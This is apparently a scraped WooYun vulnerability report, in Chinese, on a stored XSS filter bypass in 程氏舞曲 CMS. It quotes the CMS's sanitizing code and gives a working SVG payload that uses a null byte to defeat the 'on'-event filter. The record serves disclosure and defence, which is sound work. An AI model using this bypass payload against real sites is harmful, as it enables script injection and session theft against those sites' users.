{"id": 52332, "wybug_id": "wooyun-2014-071585", "wybug_title": "程氏舞曲CMS最新版再次绕过过滤存储型XSS", "wybug_corp": "chshcms.com", "wybug_author": "Jim叔叔", "wybug_date": "2014-08-08 17:06", "wybug_open_date": "2014-11-06 17:08", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向公众公开  简要描述： 继昨天修复的过滤方法，再来一发。。 详细说明：  看了一下昨天修复的代码，就是在第二个字符处添加了一个<x>，于是各种焦头烂额都不行了。。再次研究上下的代码：\nfunction uhtml($str)  {                 $farr = array(                                \"/\\\\s+/\", //过滤多余的空白                                \"/<(\\\\/?)(script|i?frame|style|html|body|title|link|meta|\\\\?|\\\\%)([^>]*?)>/isU\",                               \"/(<[^>]*)on[a-zA-Z]+\\\\s*=([^>]*>)/isU\",                );                 $tarr = array( \" \",  \" \", \"\\1\\2\", );                 $str = preg_replace( $farr,$tarr,$str);  \t       //return $str;\t       return remove_xss($str);           }\n这里把on事件过滤的死死的。。只有想办法绕过on发现remove_xss里面有这样一句：\n$val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val);\n将%00等的字符替换为空了！！于是o%00nxxx=xxx在过滤后就变成了onxxx=xxx又发现onbegin、onend没有在过滤的关键词中，于是出现了如下绕过的代码：\n<svg><animateTransform attributeName=transform o%00nbegin=alert(/UncleJim/)>\n过滤后就变为：\n<svg><animateTransform attributeName=transform onbegin=alert(/UncleJim/)>\n   漏洞证明：  火狐下有效。\n\n\n\n   修复方案：  。   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-08-08 22:19 厂商回复： 再次感谢已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}